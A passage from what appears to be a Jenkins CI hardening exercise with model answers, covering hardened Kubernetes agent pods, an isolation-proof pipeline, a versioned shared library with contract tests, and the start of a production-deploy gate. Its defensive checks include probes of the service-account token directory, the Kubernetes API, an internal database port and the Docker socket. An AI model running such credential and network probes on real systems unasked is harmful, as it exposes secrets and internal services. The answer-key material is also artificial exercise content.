      image: 'jenkins/inbound-agent:3313.vf6a_8b_1f0c4d1-1-jdk21'
      alwaysPullImage: true                # ⭐⭐ never a stale cached image
      workingDir: '/home/jenkins/agent'
      privileged: false
      runAsUser: 1000
      runAsGroup: 1000
      ttyEnabled: true
      resourceRequestCpu: '250m'
      resourceRequestMemory: '512Mi'
      resourceLimitCpu: '1'
      resourceLimitMemory: '2Gi'
      # ⭐ command and args are EMPTY — the plugin injects the agent launch
    - name: 'java'
      image: 'eclipse-temurin:21-jdk-jammy'
      command: 'sleep'
      args: 'infinity'
      alwaysPullImage: true
      privileged: false
      runAsUser: 1000
      resourceLimitCpu: '2'
      resourceLimitMemory: '4Gi'
    - name: 'kaniko'
      image: 'gcr.io/kaniko-project/executor:v1.23.2-debug'
      command: 'sleep'
      args: 'infinity'
      alwaysPullImage: true
      privileged: false                    # ⭐⭐ kaniko needs NO privileges
      runAsUser: 0                         # ⚠️ kaniko wants root in its own userns
      resourceLimitCpu: '2'
      resourceLimitMemory: '4Gi'
    - name: 'tools'
      image: 'alpine/helm:3.16.2'
      command: 'sleep'
      args: 'infinity'
      alwaysPullImage: true
      privileged: false
      runAsUser: 1000
  volumes:
    - emptyDirVolume:
        mountPath: '/home/jenkins/agent/workspace'
        memory: false
        sizeLimit: '10Gi'                  # ⭐⭐ BOUNDED — no node-filling build
  workspaceVolume:
    emptyDirWorkspaceVolume: {memory: false}
  annotations:
    - podAnnotation: {key: 'shop.example.com/purpose', value: 'ci-agent'}
    - podAnnotation: {key: 'shop.example.com/max-cost', value: 'low'}
  # ⭐ the pod-level security context — set via the raw `yaml` in the Jenkinsfile,
  #   since JCasC's template fields don't expose all of it
```

**Step 3 — the proof pipeline ⭐⭐**

```groovy
// ci/agent-proof.Jenkinsfile — ⭐ run this after every Jenkins change
@Library('shop-shared@v2.4.1') _

pipeline {
  agent {
    kubernetes {
      inheritFrom 'shop-hardened'
      label "proof-${env.BUILD_NUMBER}"       // ⭐ unique per build
      defaultContainer 'tools'
      yaml '''
spec:
  automountServiceAccountToken: false          # ⭐⭐ NO cluster token in the pod
  securityContext:
    runAsNonRoot: true
    runAsUser: 1000
    runAsGroup: 1000
    fsGroup: 1000
    seccompProfile: {type: RuntimeDefault}
  containers:
    - name: jnlp
      securityContext:
        privileged: false
        allowPrivilegeEscalation: false
        capabilities: {drop: ["ALL"]}
        runAsNonRoot: true
    - name: tools
      securityContext:
        privileged: false
        allowPrivilegeEscalation: false
        capabilities: {drop: ["ALL"]}
        runAsNonRoot: true
'''
    }
  }
  options { timestamps(); timeout(time: 20, unit: 'MINUTES') }

  stages {
    stage('🔒 Prove the agent isolation') {
      steps {
        script {
          def results = [:]

          // ── PROOF 1: we are NOT on the controller ──────────────
          echo "=== PROOF 1: not on the built-in node ==="
          echo "  NODE_NAME  = ${env.NODE_NAME}"
          echo "  NODE_LABELS= ${env.NODE_LABELS}"
          results.notOnController = !(env.NODE_NAME =~ /(?i)(built-in|master|controller)/)
          echo "  ${results.notOnController ? '✅' : '⛔'} running on ${env.NODE_NAME}"

          // ── PROOF 2: we are in a Kubernetes pod ──────────────────
          echo "\n=== PROOF 2: an ephemeral pod ==="
          def podInfo = sh(returnStdout: true, script: '''
            hostname; cat /etc/hostname; id; uname -a
            echo "  cgroup: $(cat /proc/1/cgroup | head -2)"
            ls -la /var/run/secrets/kubernetes.io/serviceaccount/ 2>&1 | head -3 || true
          ''').trim()
          echo podInfo
          results.isPod = podInfo.contains('uid=1000')
          echo "  ${results.isPod ? '✅' : '⛔'} running as uid 1000 (not root)"

          // ── PROOF 3: ⭐⭐ NO Kubernetes API access ───────────────
          echo "\n=== PROOF 3: no cluster API access ==="
          results.noToken = sh(returnStatus: true, script: '''
            test -f /var/run/secrets/kubernetes.io/serviceaccount/token && exit 1 || exit 0
          ''') == 0
          echo "  ${results.noToken ? '✅' : '⛔'} no service-account token is mounted"

          def apiReachable = sh(returnStatus: true, script: '''
            curl -sf --max-time 5 https://kubernetes.default/api 2>/dev/null && exit 0 || exit 1
          ''') == 0
          results.noApiAccess = !apiReachable
          echo "  ${results.noApiAccess ? '✅' : '⛔'} the Kubernetes API is ${apiReachable ? 'REACHABLE' : 'unreachable'}"

          // ── PROOF 4: not privileged, no capabilities ─────────────
          echo "\n=== PROOF 4: not privileged ==="
          results.notPrivileged = sh(returnStatus: true, script: '''
            # ⭐ the definitive test: can we mount a filesystem? Only privileged can.
            mkdir -p /tmp/mt && mount -t tmpfs none /tmp/mt 2>/dev/null && exit 1 || exit 0
          ''') == 0
          echo "  ${results.notPrivileged ? '✅' : '⛔'} cannot mount (i.e. not privileged)"

          def caps = sh(returnStdout: true, script: 'grep CapEff /proc/self/status').trim()
          echo "  CapEff = $caps   (0000000000000000 = no capabilities)"
          results.noCaps = caps.contains('0000000000000000')
          echo "  ${results.noCaps ? '✅' : '⛔'} capabilities dropped"

          // ── PROOF 5: no Docker socket ────────────────────────────
          echo "\n=== PROOF 5: no Docker socket ==="
          results.noDockerSocket = sh(returnStatus: true, script: '''
            test -S /var/run/docker.sock && exit 1 || exit 0
          ''') == 0
          echo "  ${results.noDockerSocket ? '✅' : '⛔⛔⛔ /var/run/docker.sock is mounted — CRITICAL"}

          // ── PROOF 6: no host paths ───────────────────────────────
          echo "\n=== PROOF 6: no host filesystem access ==="
          results.noHostRoot = sh(returnStatus: true, script: '''
            test -d /host && exit 1 || exit 0
          ''') == 0
          echo "  ${results.noHostRoot ? '✅' : '⛔'} no /host mount"

          // ── PROOF 7: cannot reach other namespaces' services ─────
          echo "\n=== PROOF 7: network isolation ==="
          results.noShopDb = sh(returnStatus: true, script: '''
            # ⭐ the NetworkPolicy should block internal cluster traffic
            nc -z -w3 postgres.shop.svc.cluster.local 5432 2>/dev/null && exit 1 || exit 0
          ''') == 0
          echo "  ${results.noShopDb ? '✅' : '⚠️'} cannot reach postgres.shop:5432"

          results.internetOk = sh(returnStatus: true, script: '''
            curl -sf --max-time 10 -o /dev/null https://repo.maven.apache.org/ && exit 0 || exit 1
          ''') == 0
          echo "  ${results.internetOk ? '✅' : '⛔'} CAN reach the internet (needed for dependencies)"

          // ── PROOF 8: Kaniko builds an image with no daemon ───────
          echo "\n=== PROOF 8: Kaniko, no daemon ==="
          container('kaniko') {
            sh '''
              set -euo pipefail
              mkdir -p /tmp/ctx
              cat > /tmp/ctx/Dockerfile <<'DEOF'
              FROM alpine:3.20
              RUN echo "built by kaniko in build ${BUILD_NUMBER:-?}" > /proof.txt
              CMD ["cat", "/proof.txt"]
              DEOF
              /kaniko/executor --context dir:///tmp/ctx --dockerfile /tmp/ctx/Dockerfile \
                --no-push --verbosity=info 2>&1 | tail -20
            '''
          }
          results.kanikoWorks = true
          echo "  ✅ Kaniko built an image with NO Docker daemon and NO privileges"

          // ── PROOF 9: the workspace is a bounded emptyDir ─────────
          echo "\n=== PROOF 9: the workspace is bounded ==="
          def df = sh(returnStdout: true, script: 'df -h "$WORKSPACE" | tail -1').trim()
          echo "  $df"
          results.boundedWorkspace = df.contains('10.0G') || df.contains('10G')
          echo "  ${results.boundedWorkspace ? '✅' : '⚠️'} the workspace volume is capped"

          // ── THE VERDICT ─────────────────────────────────────────
          echo "\n" + "=" * 62
          def failed = results.findAll { k, v -> !v }
          results.each { k, v -> echo "  ${v ? '✅' : '⛔'}  ${k}" }
          echo "=" * 62
          // ⭐ the job summary for humans
          writeFile file: 'agent-proof.md', text: """
## 🔒 Agent isolation proof — build #${env.BUILD_NUMBER}

| Check | Result |
|---|---|
${results.collect { k, v -> "| ${k} | ${v ? '✅' : '⛔'} |" }.join('\n')}

- **NODE_NAME:** `${env.NODE_NAME}`
- **Pod:** ephemeral, destroyed when this build ends
- **Privileged:** no · **Capabilities:** dropped · **SA token:** not mounted
- **Docker socket:** not mounted · **Image build:** Kaniko
""".stripIndent()
          archiveArtifacts 'agent-proof.md'

          if (failed) {
            error("⛔ ${failed.size()} isolation check(s) FAILED: ${failed.keySet()}")
          }
          echo "✅ ALL ${results.size()} ISOLATION CHECKS PASSED"
        }
      }
    }

    stage('⏱️ Prove the pod is destroyed after') {
      steps {
        script {
          // ⭐ record the pod name so we can check it's gone later
          env.AGENT_POD = env.NODE_NAME
          writeFile file: 'pod-name.txt', text: env.AGENT_POD
          archiveArtifacts 'pod-name.txt'
          echo "  this build's agent pod is ${env.AGENT_POD}"
          echo "  ⭐ verify AFTER the build: kubectl -n jenkins get pod ${env.AGENT_POD}"
          echo "     → it must be NotFound"
        }
      }
    }
  }
  post {
    always { notifySlack(text: "🔒 the agent isolation proof: ${currentBuild.currentResult}") }
  }
}
```

**Step 4 — run it, and verify the pod is destroyed**

```bash
# trigger it
curl -s -XPOST -u admin:$TOKEN "$JENKINS_URL/job/agent-proof/build"
BUILD=1
# watch the pod appear
kubectl -n jenkins get pods -w -l jenkins/label
#   proof-1-abcde   0/4   ContainerCreating   0   2s
#   proof-1-abcde   4/4   Running             0   18s
# ⭐ inspect it WHILE it runs
POD=$(kubectl -n jenkins get pods -l jenkins/label -o jsonpath='{.items[0].metadata.name}')
kubectl -n jenkins get pod $POD -o json | jq '{
  serviceAccount: .spec.serviceAccountName,
  automountToken: .spec.automountServiceAccountToken,
  podSecurityContext: .spec.securityContext,
  containers: [.spec.containers[] | {name, image, privileged: .securityContext.privileged,
    allowEscalation: .securityContext.allowPrivilegeEscalation,
    caps: .securityContext.capabilities, runAsUser: .securityContext.runAsUser}],
  volumes: [.spec.volumes[].name]
}'
# {
#   "serviceAccount": "jenkins-agent",
#   "automountToken": false,                      ⭐⭐
#   "podSecurityContext": {"runAsNonRoot": true, "runAsUser": 1000,
#                          "seccompProfile": {"type": "RuntimeDefault"}},
#   "containers": [
#     {"name":"jnlp","privileged":false,"allowEscalation":false,
#      "caps":{"drop":["ALL"]},"runAsUser":1000},   ⭐⭐
#     …
#   ],
#   "volumes": ["workspace","default-token-…"]      ← ⚠️ no hostPath, no docker.sock
# }

# the build output
#   ✅ notOnController      ✅ isPod               ✅ noToken
#   ✅ noApiAccess          ✅ notPrivileged       ✅ noCaps
#   ✅ noDockerSocket       ✅ noHostRoot          ✅ noShopDb
#   ✅ internetOk           ✅ kanikoWorks         ✅ boundedWorkspace
#   ✅ ALL 12 ISOLATION CHECKS PASSED

# ⭐⭐ and AFTER the build completes — the pod must be GONE
sleep 30
POD_NAME=$(curl -s -u admin:$TOKEN "$JENKINS_URL/job/agent-proof/$BUILD/artifact/pod-name.txt")
kubectl -n jenkins get pod "$POD_NAME"
#   Error from server (NotFound): pods "proof-1-abcde" not found      ✅⭐⭐

# ⭐ and prove it over many builds — no pod accumulation
for i in $(seq 1 5); do
  curl -s -XPOST -u admin:$TOKEN "$JENKINS_URL/job/agent-proof/build"
  sleep 5
done
sleep 180
kubectl -n jenkins get pods -l jenkins/label --no-headers | wc -l
#   0        ⭐⭐ ZERO leftover pods
```

**Step 5 — the controller-cleanliness assertion (run it weekly)**

```groovy
// ⭐ a scheduled job that asserts the controller has NEVER run a build
pipeline {
  agent { label 'shop hardened' }          // ⭐ ironically, this check runs on an agent
  triggers { cron('H 4 * * 1') }           // weekly
  stages {
    stage('Assert the controller is clean') {
      steps {
        script {
          // ⭐ via the Jenkins API: has the built-in node EVER executed anything?
          def json = sh(returnStdout: true, script: '''
            curl -sf -u "$JENKINS_USER:$JENKINS_TOKEN" \
              "$JENKINS_URL/computer/(built-in)/api/json?tree=numExecutors,executors[currentExecutable[url]],oneOffExecutors[currentExecutable[url]],offline,temporarilyOffline"
          ''').trim()
          def c = readJSON(text: json)
          echo "  numExecutors = ${c.numExecutors}"
          echo "  running      = ${c.executors*.currentExecutable*.url}"
          echo "  oneOff       = ${c.oneOffExecutors*.currentExecutable*.url}"
          if (c.numExecutors != 0) {
            error("⛔ the built-in node has ${c.numExecutors} executor(s) — a build CAN run on the controller")
          }
          if (c.executors*.currentExecutable*.url.any() || c.oneOffExecutors*.currentExecutable*.url.any()) {
            error('⛔ something is running on the controller RIGHT NOW')
          }
          echo '  ✅ the controller has zero executors and nothing running'
        }
      }
    }
    stage('Assert no privileged pod has ever been created') {
      steps {
        sh '''
          set -euo pipefail
          # ⭐ if a PodSecurity admission or an OPA/Gatekeeper policy is in place,
          #    this returns nothing. Otherwise, audit the live pods:
          PRIV=$(kubectl -n jenkins get pods -o json \
            | jq '[.items[].spec.containers[] | select(.securityContext.privileged==true)] | length')
          echo "  privileged containers right now: $PRIV"
          (( PRIV == 0 )) || { echo "⛔ a privileged container exists"; exit 1; }
          SOCK=$(kubectl -n jenkins get pods -o json \
            | jq '[.items[].spec.volumes[]? | select(.hostPath?.path=="/var/run/docker.sock")] | length')
          echo "  docker.sock hostPath mounts: $SOCK"
          (( SOCK == 0 )) || { echo "⛔⛔⛔ a pod mounts the Docker socket"; exit 1; }
          TOKEN=$(kubectl -n jenkins get pods -l jenkins/label -o json \
            | jq '[.items[] | select(.spec.automountServiceAccountToken != false)] | length')
          echo "  agent pods WITH a mounted SA token: $TOKEN"
          (( TOKEN == 0 )) || { echo "⛔ an agent pod has cluster API access"; exit 1; }
          echo "  ✅ no privileged container, no docker.sock, no SA token"
        '''
      }
    }
  }
}
```

> 🔑 **The answer to say out loud:** *"Four controls, each proven from inside a build rather than asserted from a document. The built-in node has zero executors and mode EXCLUSIVE, so a build literally cannot be scheduled there — and a weekly job queries `/computer/(built-in)/api/json` to assert that's still true, because someone will eventually raise it to fix a queueing problem. Every agent is an ephemeral pod with `idleMinutes: 0` and `podRetention: never`, verified by recording the pod name in an artifact and asserting `kubectl get pod` returns NotFound thirty seconds later, and by running five builds and confirming zero pods remain. No privilege: `privileged: false`, `allowPrivilegeEscalation: false`, `capabilities.drop: [ALL]`, `runAsNonRoot`, a bounded `emptyDir` workspace — and the proof pipeline actually tries `mount -t tmpfs` inside the pod, which only succeeds if privileged. And no cluster access: `automountServiceAccountToken: false`, the agent ServiceAccount has no Role or RoleBinding at all, the controller's is a namespace-scoped Role (verified with `kubectl auth can-i` that it cannot read secrets in `shop`), and a NetworkPolicy lets the agent reach the internet for dependencies but not internal cluster services. Images build with Kaniko, which needs no daemon and no privileges — so `/var/run/docker.sock` is never mounted anywhere, and the proof job fails hard if it ever finds one."*

---

### Task 3.2 — The shared library, tested and pinned

**Requirements:** three jobs consume the same build/test/deploy logic from a **separate Git repository**. The library is pinned per job. It has unit tests. A breaking change cannot silently reach consumers. Every `vars/` step is documented.

**✅ Answer**

**Step 1 — the library repository**

```bash
gh repo create pipeline-library --private --clone --description "The shop CI shared library"
cd pipeline-library
mkdir -p src/com/shop/ci vars resources/pod-templates resources/slack \
         test/groovy/com/shop/ci docs
cat > library.yaml <<'EOF'
name: shop-shared
version: 2.4.1                    # ⭐⭐ the single source of truth for the version
maintainers: [platform-team@shop.example.com]
breakingChangesRequireNewMajor: true
EOF
```

**Step 2 — the API contract, written first ⭐**

```markdown
<!-- docs/API.md — ⭐⭐ the contract test asserts this file matches the code -->
# shop-shared

Reusable Jenkins pipeline steps for the shop platform.

## Versioning
| Reference | Meaning | Use for |
|---|---|---|
| `@Library('shop-shared@v2') _` | the latest v2.x.x — a MOVABLE tag | internal jobs you control |
| `@Library('shop-shared@v2.4.1') _` | ⭐ an immutable release tag | **most jobs** |
| `@Library('shop-shared@<40-char-sha>') _` | ⭐⭐ a commit | security-critical jobs |
| `@Library('shop-shared') _` | ⛔ the configured default version | never — it's mutable |

A **breaking** change always gets a new major. We never force-push a major tag
to introduce a breaking change. `Load implicitly` is OFF in Jenkins, so every
consumer declares its version explicitly and it is visible in review.

## Steps

### `notifySlack`
Posts to Slack. **Never fails the build** unless `failOnError: true`.
| Parameter | Type | Default | Description |
|---|---|---|---|
| `text` | String | a generated message | The title |
| `color` | String | derived from the result | `good`\|`warning`\|`danger`\|hex |
| `channel` | String | the webhook default | A channel override |
| `credentialsId` | String | `slack-webhook` | |
| `fields` | List<Map> | `[]` | Extra `[title:, value:, short:]` fields |
| `failOnError` | boolean | `false` | |

### `deployTo`
Deploys the digests stashed by `buildAndPushImage` to an environment.
| Parameter | Type | Required | Default | Description |
|---|---|---|---|---|
| `environment` | String | ✅ | — | `dev`\|`staging`\|`production` |
| `revision` | String | | `env.GIT_COMMIT` | |
| `chartPath` | String | | `helm/shop` | |
| `release` | String | | `shop` | |
| `namespace` | String | | `shop` | |
| `dryRun` | boolean | | `false` | |
| `atomic` | boolean | | `true` | `helm --atomic` |
| `timeout` | String | | `10m` | |
| `smokeTest` | boolean | | `true` | |
| `rollbackOnFailure` | boolean | | `true` | |
| `kubeCredentialsId` | String | | `kubeconfig-<env>` | |

**Guards built in:** production may only be deployed from `main`; a pull-request
build is refused; the digest stash must exist; the deployed revision is verified
against the cluster after the upgrade.

### `buildAndPushImage`
### `productionGate`
### `standardPipeline`
(…documented identically…)

## Migration notes
- **v1 → v2**: `deployTo(env)` positional form kept as an overload; `maxVulnerabilities`
  split into `maxCritical` / `maxHigh`.
- **v2.3 → v2.4**: added `strategy` to `productionGate`. Backwards compatible.
- **v2 → v3** *(upcoming)*: `buildAndPushImage` will REQUIRE `service` and drop
  the positional form. Announced 2026-08-01; lands no earlier than 2026-11-01.
```

**Step 3 — the library's own CI, including the contract test**

```groovy
// Jenkinsfile (in the LIBRARY repo)
pipeline {
  agent { kubernetes { inheritFrom 'shop-hardened'; defaultContainer 'java' } }
  options { timestamps(); timeout(time: 30, unit: 'MINUTES'); disableConcurrentBuilds() }

  environment {
    LIB_VERSION = "${sh(returnStdout: true, script: "grep -oE '^version: .*' library.yaml | awk '{print \$2}'").trim()}"
  }

  stages {
    stage('Lint') {
      steps {
        sh '''
          set -euo pipefail
          echo "==> npm-groovy-lint"
          npx --yes npm-groovy-lint --path 'src/**/*.groovy' --path 'vars/*.groovy' \
            --failon error --output text || {
              echo "::the Groovy lint failed"; exit 1; }
          echo "==> the vars/ files must each define `def call`"
          for f in vars/*.groovy; do
            grep -qE '^def call\(' "$f" || { echo "  ⛔ $f has no `def call(...)`"; exit 1; }
          done
          echo "  ✅ every vars/ file defines call()"
        '''
      }
    }

    stage('⭐ Contract test — the docs match the code') {
      steps {
        sh '''
          set -euo pipefail
          fail=0
          for f in vars/*.groovy; do
            step=$(basename "$f" .groovy)
            # 1. documented?
            grep -q "^### \`${step}\`" docs/API.md || {
              echo "  ⛔ \`${step}\` is not documented in docs/API.md"; fail=1; continue; }
            # 2. ⭐ every `config.X` parameter read by the step appears in the docs table
            params=$(grep -oE 'config\.[a-zA-Z]+' "$f" | sed 's/config\.//' | sort -u)
            for p in $params; do
              grep -qE "^\| \`${p}\` \|" docs/API.md || {
                echo "  ⛔ \`${step}\` reads config.${p} but it is not in the docs table"; fail=1; }
            done
            echo "  ✅ ${step}: $(echo "$params" | wc -w) documented parameter(s)"
          done
          # 3. ⭐ the version in library.yaml has a corresponding migration note
          V=$(grep -oE '^version: .*' library.yaml | awk '{print $2}')
          MAJOR=${V%%.*}
          grep -q "v${MAJOR}" docs/API.md || {
            echo "  ⛔ no migration notes mention v${MAJOR}"; fail=1; }
          (( fail == 0 )) || exit 1
          echo "  ✅ the contract test passed"
        '''
      }
    }

    stage('⭐ Unit tests (JenkinsPipelineUnit)') {
      steps {
        sh '''
          set -euo pipefail
          ./gradlew test --info --no-daemon
        '''
      }
      post {
        always {
          junit testResults: 'build/test-results/test/*.xml', allowEmptyResults: false
          recordCoverage(tools: [[parser: 'JACOCO', pattern: 'build/reports/jacoco/test/jacocoTestReport.xml']],
                         unhealthyCoverage: 70, failingCoverage: 50)
        }
      }
    }

    stage('⭐ Breaking-change detection') {
      when { changeRequest() }
      steps {
        script {
          // ⭐ compare the public API surface against the last release tag
          def before = sh(returnStdout: true, script: '''
            git fetch --tags -q
            LAST=$(git describe --tags --abbrev=0 2>/dev/null || echo "")
            [ -z "$LAST" ] && exit 0
            for f in vars/*.groovy; do
              git show "$LAST:$f" 2>/dev/null | grep -oE '^def call\([^)]*\)' || true
              git show "$LAST:$f" 2>/dev/null | grep -oE 'config\\.[a-zA-Z]+' || true
            done | sort -u
          ''').trim().readLines()
          def after = sh(returnStdout: true, script: '''
            for f in vars/*.groovy; do
              grep -oE '^def call\\([^)]*\\)' "$f" || true
              grep -oE 'config\\.[a-zA-Z]+' "$f" || true
            done | sort -u
          ''').trim().readLines()
          def removed = before - after            // ⭐ a REMOVED signature = breaking
          if (removed) {
            def msg = "⛔ BREAKING CHANGE — these public API elements were removed:\n  ${removed.join('\n  ')}"
            echo msg
            // ⭐ the rule: a breaking change must bump the MAJOR version
            def currentMajor = env.LIB_VERSION.tokenize('.')[0]
            def lastTag = sh(returnStdout: true, script: 'git describe --tags --abbrev=0').trim()
            def lastMajor = lastTag.replaceAll('^v','').tokenize('.')[0]
            if (currentMajor == lastMajor) {
              error("${msg}\n\n⭐ You MUST bump the major version in library.yaml " +
                    "from ${env.LIB_VERSION} to ${currentMajor.toInteger()+1}.0.0, " +
                    "and add a migration note to docs/API.md.")
            } else {
              echo "  ✅ a breaking change with a major bump — correct"
              // ⭐ and it must be announced
              def grepRc = sh(returnStatus: true,
                script: "grep -q 'BREAKING' docs/API.md && grep -q '${currentMajor}.0.0' docs/API.md")
              if (grepRc != 0) { error('a breaking change must be announced in docs/API.md') }
            }
          } else {
            echo '  ✅ no public API element was removed'
          }
        }
      }
    }

    stage('Release') {
      when { branch 'main'; not { changeRequest() } }
      steps {
        script {
          sh '''
            set -euo pipefail
            V="${LIB_VERSION}"
            git config user.name  "shop-ci[bot]"
            git config user.email "shop-ci@shop.example.com"
            if git rev-parse "v$V" >/dev/null 2>&1; then
              echo "  ⚠️  tag v$V already exists — the version was not bumped"; exit 0
            fi
            git tag -a "v$V" -m "v$V"
            MAJOR="${V%%.*}"
            git tag -fa "v$MAJOR" -m "v$MAJOR → v$V"
            git push origin "v$V" && git push -f origin "v$MAJOR"
            echo "  ✅ released v$V (and moved v$MAJOR)"
          '''
        }
      }
      post {
        success { notifySlack(text: "📦 shop-shared v${env.LIB_VERSION} released") }
      }
    }
  }
  post { always { cleanWs(deleteDirs: true, notFailBuild: true) } }
}
```

**Step 4 — the consumers, each pinned deliberately**

```groovy
// 🛒 shop/main — a normal app job. ⭐ pinned to an immutable tag.
@Library('shop-shared@v2.4.1') _
standardPipeline(
  services: ['shop-api', 'checkout', 'order-worker', 'shop-ui', 'payment-mock'],
  environments: ['dev', 'staging', 'production'],
  maxCritical: 0
)
```

```groovy
// 🚀 shop/production/deploy — ⭐⭐ the security-critical job. Pinned to a SHA.
@Library('shop-shared@a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2') _   // == v2.4.1
pipeline {
  agent { kubernetes { inheritFrom 'shop-hardened' } }
  options { timestamps(); timeout(time: 60, unit: 'MINUTES'); disableConcurrentBuilds() }
  parameters {
    choice(name: 'ENVIRONMENT', choices: ['production'])
    string(name: 'REVISION', defaultValue: '')
    booleanParam(name: 'DRY_RUN', defaultValue: false)
  }
  stages {
    stage('Gate')  { steps { productionGate(environment: 'production') } }
    stage('Approve') {
      steps {
        timeout(time: 8, unit: 'HOURS') {
          input message: '🚀 approve the production deploy', submitter: 'sre-team',
                submitterParameter: 'APPROVER', ok: '✅ Deploy'
        }
      }
    }
    stage('Deploy') {
      steps {
        lock(resource: 'deploy-production', inversePrecedence: true) {
          script { deployTo(environment: 'production',
                            revision: params.REVISION ?: env.GIT_COMMIT,
                            dryRun: params.DRY_RUN) }
        }
      }
    }
  }
  post { always { notifySlack() } }
}
```

```groovy
// 🧪 platform/library-canary — ⭐⭐ THE CANARY CONSUMER
// This job tracks `@v2` (the MOVABLE major tag). It runs on every library release
// and on a schedule. Its purpose is to detect a library regression BEFORE the
// pinned consumers get it.
@Library('shop-shared@v2') _
standardPipeline(services: ['payment-mock'], environments: ['dev'])
```

**Step 5 — the library-version inventory ⭐**

```groovy
// ⭐ a job that reports which version every consumer is on — the thing that
//   makes a library rollout manageable
pipeline {
  agent { kubernetes { inheritFrom 'shop-hardened'; defaultContainer 'tools' } }
  triggers { cron('H 6 * * 1') }
  stages {
    stage('Inventory the consumers') {
      steps {
        script {
          def report = [:]
          def items = sh(returnStdout: true, script: '''
            curl -sf -u "$JENKINS_USER:$JENKINS_TOKEN" \
              "$JENKINS_URL/api/json?tree=jobs[name,jobs[name,url]]" | jq -r '.. | .url? // empty'
          ''').trim().readLines()
          items.each { url ->
            def name = url.replaceAll(env.JENKINS_URL, '').replaceAll('/$', '').replaceAll('/job/', '/')
            def script = sh(returnStdout: true, script: """
              curl -sf -u "\$JENKINS_USER:\$JENKINS_TOKEN" \\
                "${url}config.xml" 2>/dev/null | grep -oE 'shop-shared@[^\\'"< ]+' | head -1 || true
            """).trim()
            report[name] = script ?: '(no @Library — uses the default or none)'
          }
          // ⭐ the version distribution
          def dist = report.values().countBy { it }
          writeFile file: 'library-versions.md', text: """
## 📚 shop-shared version inventory — ${new Date().format('yyyy-MM-dd')}

| Version | Jobs |
|---|---|
${dist.collect { v, n -> "| `${v}` | ${n} |" }.join('\n')}

<details><summary>Per job</summary>

| Job | Version |
|---|---|
${report.collect { k, v -> "| `${k}` | `${v}` |" }.join('\n')}

</details>

${dist.size() > 3 ? '> ⚠️ More than 3 distinct versions in use. Plan a consolidation.' : ''}
""".stripIndent()
          archiveArtifacts 'library-versions.md'
          dist.each { v, n -> echo "  ${v.padRight(50)} ${n} job(s)" }
          notifySlack(text: "📚 library inventory: ${dist.size()} distinct version(s) across ${report.size()} job(s)",
                      fields: dist.collect { v, n -> [title: v, value: "${n}", short: true] })
        }
      }
    }
  }
}
```

```
Expected output:
  shop-shared@v2.4.1                                       11 job(s)
  shop-shared@a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2      1 job(s)   ← production
  shop-shared@v2                                            1 job(s)   ← the canary
  shop-shared@v2.3.0                                        2 job(s)   ⚠️ migrate these
  (no @Library — uses the default or none)                  1 job(s)   ⛔ fix this
```

> 🔑 **The answer to say out loud:** *"Four mechanisms make the library safe. The **contract test** parses every `vars/*.groovy`, extracts each `config.X` the step reads, and fails unless `docs/API.md` has a table row for it — so the documentation cannot drift from the code, which is the usual reason teams stop trusting a library. The **breaking-change detector** runs on every PR, diffs the public API surface (`def call(...)` signatures and every `config.` key) against the last release tag, and if anything was removed it fails unless the major version was bumped in `library.yaml` AND a migration note was added. The **pinning discipline** is three-tiered: normal jobs pin an immutable tag like `@v2.4.1`, the production deploy job pins a full commit SHA, and one dedicated canary job tracks the movable `@v2` major tag on a schedule so a library regression is detected before any pinned consumer sees it — and `Load implicitly` is OFF so every consumer's version is visible in review. And a weekly **inventory job** walks every job's config.xml and reports the version distribution, because a library with eleven jobs on one version, two on an old one and one on none is a library nobody is actually maintaining."*

---

### Task 3.3 — Approval + mutex + window gate, with a safe timeout

**Requirements:** production deploys need (a) an approval from the `sre-team` group, (b) a mutex so two deploys never overlap, (c) a programmatic window gate, (d) a timeout that **fails safely** rather than silently proceeding, and (e) a rehearsed rollback.

**✅ Answer**

```groovy
// ci/production-deploy.Jenkinsfile
@Library('shop-shared@v2.4.1') _

pipeline {
  agent { kubernetes { inheritFrom 'shop-hardened'; defaultContainer 'tools' } }

  options {
    timestamps()
    ansiColor('xterm')
    timeout(time: 12, unit: 'HOURS')          // ⭐ the OUTER timeout > the input timeout
    disableConcurrentBuilds()                 // ⭐ the queue-level mutex for THIS job
    buildDiscarder(logRotator(numToKeepStr: '200', daysToKeepStr: '365'))
    // ⭐⭐ 365 days for production deploys — that's your compliance evidence
  }

  parameters {
    string(name: 'REVISION', defaultValue: '', description: 'The git SHA (blank = latest main)')
    choice(name: 'STRATEGY', choices: ['canary', 'rolling', 'blue-green'])
    booleanParam(name: 'DRY_RUN', defaultValue: false)
    booleanParam(name: 'GATE_OVERRIDE', defaultValue: false,
                 description: '⚠️ Bypass the programmatic gate. Requires a reason.')
    string(name: 'GATE_OVERRIDE_REASON', defaultValue: '',
           description: '⭐ Mandatory when GATE_OVERRIDE is true (≥20 characters)')
    string(name: 'CHANGE_TICKET', defaultValue: '', description: 'CHG-12345')
  }

  environment {
    NAMESPACE = 'shop'
    RELEASE   = 'shop'
  }

  stages {
    // ══════════════════════════════════════════════════════════
    stage('1 · Resolve') {
      steps {
        checkout scm
        script {
          env.REV = params.REVISION ?:
            sh(returnStdout: true, script: 'git rev-parse origin/main').trim()
          // ⭐⭐ PROVE the revision passed CI before we even ask for approval
          def ciResult = sh(returnStdout: true, script: """
            curl -sf -u "\$JENKINS_USER:\$JENKINS_TOKEN" \\
              "\$JENKINS_URL/job/shop/job/main/api/json?tree=builds[number,result,actions[lastBuiltRevision[SHA1]]]{0,20}" \\
              | jq -r '[.builds[] | select(.result=="SUCCESS") |
                        select(.actions[]?.lastBuiltRevision?.SHA1=="${env.REV}")] | length'
          """).trim()
          if (ciResult == '0') {
            error("⛔ revision ${env.REV.take(7)} has no SUCCESSFUL CI build — refusing to deploy")
          }
          echo "  ✅ ${env.REV.take(7)} passed CI"
          currentBuild.displayName = "#${env.BUILD_NUMBER} · ${env.REV.take(7)} · ${params.STRATEGY}"
        }
      }
    }

    // ══════════════════════════════════════════════════════════
    stage('2 · ⛔ Gate') {
      when { beforeAgent true }              // ⭐ evaluate BEFORE allocating a pod
      steps {
        script {
          // ⭐⭐ the WINDOW is computed here, before anyone is asked to approve.
          //    Asking for an approval you're going to refuse wastes an SRE's attention.
          def now = java.time.ZonedDateTime.now(java.time.ZoneId.of('Asia/Kolkata'))
          def day = now.dayOfWeek
          def inWindow = day in [java.time.DayOfWeek.MONDAY, java.time.DayOfWeek.TUESDAY,
                                 java.time.DayOfWeek.WEDNESDAY, java.time.DayOfWeek.THURSDAY] &&
                         now.hour >= 10 && now.hour < 17
